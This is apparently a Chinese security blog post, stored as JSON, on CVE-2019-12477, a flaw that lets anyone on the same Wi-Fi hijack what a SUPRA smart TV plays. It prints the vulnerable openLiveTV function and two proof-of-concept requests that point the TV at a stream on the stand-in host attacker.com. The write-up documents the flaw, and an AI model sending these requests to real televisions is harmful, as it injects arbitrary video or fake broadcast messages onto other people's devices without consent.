{"title":"SUPRA智能TV脆弱性","slug":"硬件物联/物联安全/智能电视/SUPRA智能TV脆弱性","date":"2019-07-17T06:36:30.000Z","updated":"2020-10-10T02:37:43.432Z","url":"2019/7-17-68.html","path":"api/articles/2019/7-17-68.html.json","covers":null,"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"SUPRA智能云播放劫持\"><a href=\"#SUPRA智能云播放劫持\" class=\"headerlink\" title=\"SUPRA智能云播放劫持\"></a>SUPRA智能云播放劫持</h4><p>描述：SUPRA智能云电视存在播放可劫持漏洞（CVE-2019-12477），与SUPRA电视处于同一无线网络环境中的攻击者，可向电视设备伪造播放请求，插播任意视频内容或虚假广播消息。</p>\n<p>Dhiraj Mishra发现的漏洞问题在于电视流媒体获取功能 ‘openLiveURL()’，SUPRA电视用它来获取流媒体的播放内容,该功能缺乏必要的认证授权和会话管理措施，攻击者可以通过向一个静态的URL发送构造请求来触发漏洞，绕过授权验证，向播放机制中注入远程视频流文件，播放任意视频内容。</p>\n<p><strong>漏洞详情</strong><br>漏洞接口位于 /remote/media_control?action=setUri&amp;uri=URI服务端，存在漏洞的功能函数为openLiveTV(url)，以下为openLiveTV(url)函数源码片段：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> openLiveTV(url)  &#123;  </span><br><span class=\"line\">    $.get(<span class=\"string\">\"/remote/media_control\"</span>, &#123;</span><br><span class=\"line\">        m_action:<span class=\"string\">'setUri'</span>,</span><br><span class=\"line\">        m_uri:url,m_type:<span class=\"string\">'video/*'</span></span><br><span class=\"line\">        &#125;,  <span class=\"keyword\">function</span> (data, textStatus)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">\"success\"</span>==textStatus)&#123;   </span><br><span class=\"line\">             alert(textStatus);   </span><br><span class=\"line\">             &#125;<span class=\"keyword\">else</span>   &#123;    </span><br><span class=\"line\">            alert(textStatus);   &#125;  </span><br><span class=\"line\">            &#125;);  </span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure></p>\n<p>向电视设备插入任意视频播放的构造请求POC：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /remote/media_control?action=setUri&amp;uri=http://attacker.com/fake_broadcast_message.m3u8 </span><br><span class=\"line\">HTTP/1.1Host: 192.168.1.155</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p>\n<p>直接用以下方式向处于同一无线网络环境中的SUPRA智能电视发起请求，也能实现插播效果POC：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.1.155/remote/media_control?action=setUri&amp;uri=http://attacker.com/fake_broadcast_message.m3u8</span><br></pre></td></tr></table></figure></p>\n<p>备注：</p>\n<ul>\n<li><a href=\"https://www.inputzero.io/2019/06/hacking-smart-tv.html\" target=\"_blank\" rel=\"noopener\">https://www.inputzero.io/2019/06/hacking-smart-tv.html</a></li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"物联安全","path":"api/categories/物联安全.json"}],"tags":[{"name":"SUPRATV","path":"api/tags/SUPRATV.json"}]}